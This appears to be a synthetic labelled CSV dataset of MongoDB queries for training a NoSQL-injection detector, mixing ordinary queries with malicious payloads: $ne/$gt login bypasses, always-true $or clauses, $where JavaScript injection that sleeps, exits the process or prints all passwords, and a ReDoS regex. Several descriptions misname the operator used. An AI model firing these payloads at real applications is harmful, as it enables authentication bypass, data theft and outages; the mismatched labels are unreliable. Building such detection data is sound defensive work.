id,label,type,collection,query,full_command,description,timestamp
6017,malicious,operator_injection,transactions,"{""id"": {""$nin"": """"}}","db.transactions.find({""id"": {""$nin"": """"}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.329768
6018,malicious,array_injection,users,"{""user_id.0"": {""$exists"": true}}","db.users.find({""user_id.0"": {""$exists"": true}})",Injection through array operators,2025-11-24T21:15:54.309237
6019,malicious,type_confusion,logs,"{""role"": {}}","db.logs.find({""role"": {}})",Exploiting type system for injection attack,2025-11-24T21:15:54.354517
6020,malicious,operator_injection,accounts,"{""status"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.accounts.find({""status"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.358740
6021,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.562601
6022,malicious,operator_injection,products,"{""email"": {""$regex"": "".*""}}","db.products.find({""email"": {""$regex"": "".*""}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.347637
6023,malicious,array_injection,products,"{""admin"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}}","db.products.find({""admin"": {""$in"": [null, """", ""admin"", {""$gt"": """"}]}})",Injection through array operators,2025-11-24T21:15:54.322900
6024,benign,aggregation_query,comments,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.comments.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.520421
6025,benign,simple_find,articles,"{""price"": 75.1}","db.articles.find({""price"": 75.1})",Simple field match query,2025-11-24T21:15:54.503840
6026,malicious,operator_injection,customers,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.customers.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.304610
6027,malicious,operator_injection,products,"{""role"": {""$exists"": true, ""$ne"": null}}","db.products.find({""role"": {""$exists"": true, ""$ne"": null}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.295575
6028,benign,aggregation_query,customers,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.customers.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.496877
6029,malicious,operator_injection,accounts,"{""username"": ""hjiang"", ""password"": {""$ne"": """"}}","db.accounts.find({""username"": ""hjiang"", ""password"": {""$ne"": """"}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.350650
6030,malicious,regex_injection,transactions,"{""user_id"": {""$regex"": "".*""}}","db.transactions.find({""user_id"": {""$regex"": "".*""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.317329
6031,benign,aggregation_query,articles,"[{""$match"": {""status"": ""active""}}, {""$count"": ""total""}]","db.articles.aggregate([{""$match"": {""status"": ""active""}}, {""$count"": ""total""}])",Aggregation pipeline query,2025-11-24T21:15:54.519794
6032,benign,update_query,products,"{""filter"": {""_id"": ""6f2ba37e-a0fe-451e-8684-e4388cd5219a""}, ""update"": {""$set"": {""name"": ""\u5f20\u8d85""}}}","db.products.updateOne({""_id"": ""6f2ba37e-a0fe-451e-8684-e4388cd5219a""}, {""$set"": {""name"": ""\u5f20\u8d85""}})",Document update operation,2025-11-24T21:15:54.419281
6033,malicious,or_injection,sessions,"{""$or"": [{""username"": ""admin""}, {""1"": ""1""}]}","db.sessions.find({""$or"": [{""username"": ""admin""}, {""1"": ""1""}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.310675
6034,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.466171
6035,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.464910
6036,malicious,type_confusion,orders,"{""password"": {""$not"": {""$type"": 10}}}","db.orders.find({""password"": {""$not"": {""$type"": 10}}})",Exploiting type system for injection attack,2025-11-24T21:15:54.292267
6037,benign,simple_find,products,"{""role"": ""user""}","db.products.find({""role"": ""user""})",Simple field match query,2025-11-24T21:15:54.426477
6038,malicious,type_confusion,products,"{""$and"": [{""token"": {""$exists"": true}}, {""token"": {""$type"": ""object""}}]}","db.products.find({""$and"": [{""token"": {""$exists"": true}}, {""token"": {""$type"": ""object""}}]})",Exploiting type system for injection attack,2025-11-24T21:15:54.303195
6039,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""name"": 1, ""email"": 1, ""_id"": 0})",Query with field projection,2025-11-24T21:15:54.381434
6040,benign,simple_find,logs,"{""category"": ""electronics""}","db.logs.find({""category"": ""electronics""})",Simple field match query,2025-11-24T21:15:54.482292
6041,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.401023
6042,malicious,json_injection,accounts,"{""constructor"": {""prototype"": {""admin"": true}}}","db.accounts.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.354332
6043,malicious,where_injection,logs,"{""$where"": ""function() { var x = this.password; return x.match(/.*/) }""}","db.logs.find({""$where"": ""function() { var x = this.password; return x.match(/.*/) }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.320696
6044,malicious,where_injection,sessions,"{""$where"": ""this.password.match(/^a/)""}","db.sessions.find({""$where"": ""this.password.match(/^a/)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.313313
6045,malicious,or_injection,accounts,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.accounts.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.303732
6046,malicious,or_injection,products,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.products.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.350793
6047,malicious,where_injection,users,"{""$where"": ""function() { return this.role == 'admin' }""}","db.users.find({""$where"": ""function() { return this.role == 'admin' }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.349319
6048,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.406623
6049,benign,find_with_sort,users,{},"db.users.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.520897
6050,malicious,aggregation_injection,users,"[{""$lookup"": {""from"": ""users"", ""localField"": ""_id"", ""foreignField"": ""_id"", ""as"": ""leaked""}}]","db.users.aggregate([{""$lookup"": {""from"": ""users"", ""localField"": ""_id"", ""foreignField"": ""_id"", ""as"": ""leaked""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.332332
6051,malicious,or_injection,transactions,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.transactions.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.317414
6052,malicious,type_confusion,orders,"{""email"": []}","db.orders.find({""email"": []})",Exploiting type system for injection attack,2025-11-24T21:15:54.327337
6053,malicious,where_injection,customers,"{""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""}","db.customers.find({""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.290677
6054,malicious,where_injection,sessions,"{""$where"": ""db.users.find().forEach(function(u){print(u.password)})""}","db.sessions.find({""$where"": ""db.users.find().forEach(function(u){print(u.password)})""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.290588
6055,benign,aggregation_query,sessions,"[{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}]","db.sessions.aggregate([{""$group"": {""_id"": ""$category"", ""count"": {""$sum"": 1}}}])",Aggregation pipeline query,2025-11-24T21:15:54.546798
6056,benign,find_with_sort,customers,{},"db.customers.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.408559
6057,malicious,type_confusion,logs,"{""role"": {}}","db.logs.find({""role"": {}})",Exploiting type system for injection attack,2025-11-24T21:15:54.292570
6058,malicious,operator_injection,users,"{""name"": {""$in"": [""admin"", ""root"", ""administrator""]}}","db.users.find({""name"": {""$in"": [""admin"", ""root"", ""administrator""]}})",Using $in operator to bypass authentication or leak data,2025-11-24T21:15:54.325922
6059,benign,find_with_projection,sessions,"{""status"": ""active""}","db.sessions.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.504775
6060,benign,find_with_sort,logs,{},"db.logs.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.435426
6061,malicious,operator_injection,customers,"{""_id"": {""$ne"": null}}","db.customers.find({""_id"": {""$ne"": null}})",Using $nin operator to bypass authentication or leak data,2025-11-24T21:15:54.325649
6062,malicious,operator_injection,sessions,"{""id"": {""$exists"": true, ""$ne"": null}}","db.sessions.find({""id"": {""$exists"": true, ""$ne"": null}})",Using $lte operator to bypass authentication or leak data,2025-11-24T21:15:54.309737
6063,benign,find_with_sort,users,{},"db.users.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.482158
6064,benign,find_with_sort,users,{},"db.users.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.518851
6065,benign,aggregation_query,orders,"[{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}]","db.orders.aggregate([{""$group"": {""_id"": ""$status"", ""avgPrice"": {""$avg"": ""$price""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.444686
6066,malicious,regex_injection,orders,"{""token"": {""$regex"": ""admin.*"", ""$options"": ""i""}}","db.orders.find({""token"": {""$regex"": ""admin.*"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.319111
6067,benign,simple_find,customers,"{""order_id"": ""c5d0612d-4b1d-4296-9fc8-10335be330e5""}","db.customers.find({""order_id"": ""c5d0612d-4b1d-4296-9fc8-10335be330e5""})",Simple field match query,2025-11-24T21:15:54.471409
6068,malicious,json_injection,products,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}","db.products.find({""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.296046
6069,malicious,regex_injection,accounts,"{""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}}","db.accounts.find({""email"": {""$regex"": ""^a(a+)+$"", ""$options"": ""i""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.342211
6070,malicious,operator_injection,accounts,"{""name"": {""$regex"": "".*""}}","db.accounts.find({""name"": {""$regex"": "".*""}})",Using $exists operator to bypass authentication or leak data,2025-11-24T21:15:54.314455
6071,malicious,where_injection,products,"{""$where"": ""this.constructor.constructor('return process')().exit()""}","db.products.find({""$where"": ""this.constructor.constructor('return process')().exit()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.316412
6072,benign,find_with_projection,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.518010
6073,benign,find_with_sort,products,{},"db.products.find({}).sort({""created_at"": -1})",Query with sorting,2025-11-24T21:15:54.507874
6074,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.470394
6075,benign,find_with_sort,orders,{},"db.orders.find({}).sort({""updated_at"": -1})",Query with sorting,2025-11-24T21:15:54.490391
6076,benign,simple_find,logs,"{""email"": ""elong@example.net""}","db.logs.find({""email"": ""elong@example.net""})",Simple field match query,2025-11-24T21:15:54.524720
6077,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(403).limit(80)",Query with pagination,2025-11-24T21:15:54.508004
6078,benign,count_query,comments,"{""created_at"": {""$gte"": ""2025-11-22""}}","db.comments.countDocuments({""created_at"": {""$gte"": ""2025-11-22""}})",Document count query,2025-11-24T21:15:54.512040
6079,benign,find_with_sort,articles,{},"db.articles.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.422573
6080,benign,aggregation_query,users,"[{""$match"": {""created_at"": {""$gte"": ""2025-11-04""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}]","db.users.aggregate([{""$match"": {""created_at"": {""$gte"": ""2025-11-04""}}}, {""$group"": {""_id"": null, ""total"": {""$sum"": ""$total""}}}])",Aggregation pipeline query,2025-11-24T21:15:54.370763
6081,benign,find_with_sort,sessions,{},"db.sessions.find({}).sort({""price"": -1})",Query with sorting,2025-11-24T21:15:54.461985
6082,benign,simple_find,orders,"{""username"": ""jenningsjennifer""}","db.orders.find({""username"": ""jenningsjennifer""})",Simple field match query,2025-11-24T21:15:54.547456
6083,benign,find_with_projection,orders,"{""status"": ""active""}","db.orders.find({""status"": ""active""}, {""price"": 1, ""name"": 1, ""stock"": 1})",Query with field projection,2025-11-24T21:15:54.512893
6084,malicious,json_injection,customers,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.customers.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.353481
6085,malicious,or_injection,users,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.users.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.318886
